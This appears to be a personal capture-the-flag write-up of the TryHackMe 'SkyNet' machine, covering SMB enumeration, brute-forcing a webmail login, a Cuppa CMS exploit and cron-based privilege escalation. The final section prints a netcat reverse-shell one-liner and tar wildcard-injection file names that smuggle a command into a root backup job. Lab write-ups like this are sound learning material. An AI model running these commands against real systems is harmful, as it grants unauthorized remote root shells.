# SkyNet - TryHackMe Machine

## Enumeration
- Started of by scanning all ports and then running a detailed scan on all the open ports.
- Discovered a webserver running on port 80, closed ssh port can't do much with that. Also an smb port running samba. 
- So I tried listing all the users on the smb server, found an user account 'milesdyson'. 
```bash 
smbclient -L //<IP>/
```
- smbport also allows anonymous login, logged into the server searched for some file or some sort of clue. Found a text file which probably has a list of possible passwords. 
- gobuster had revealed a /squirrelmail endpoint previously, so I tried to bruteforce that login form with the list of possible passwords. 
- Got into milesdyson's mail. 
- Found an email with milesdyson's smb server password -> easy login into smb server 
- Easily found another endpoint and after running gobuster on that endpoint found an admin login page 

## Admin login page 
- the admin page was using cuppa CMS which has some known vulnerabilities 
- I'm trying to break into it using miles' password but that doesn't work, he isn't the administrator. 
- I did find an exploit for Cuppa CMS from exploit-db but I'm not quite sure if I'm using it right, it's not working. 
- Okay so I just had to make a POST request to that URL, earlier I was trying to open it in the browser.

**GAINED INITIAL ACCESS**

## Privilege Escalation
- no luck with /etc/shadow/shadow
- no exploitable path variables 
- so I checked /etc/crontab
    - found backup.sh is running every minute which can be exploited 
    - Don't really know how this worked but it did 
    ```bash 
    cd /var/www/html
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.3.38 4443 >/tmp/f" > shell.sh
    touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
    touch "/var/www/html/--checkpoint=1"
    ```
    - after running these opened a netcat listener on port 4443 and gained root access
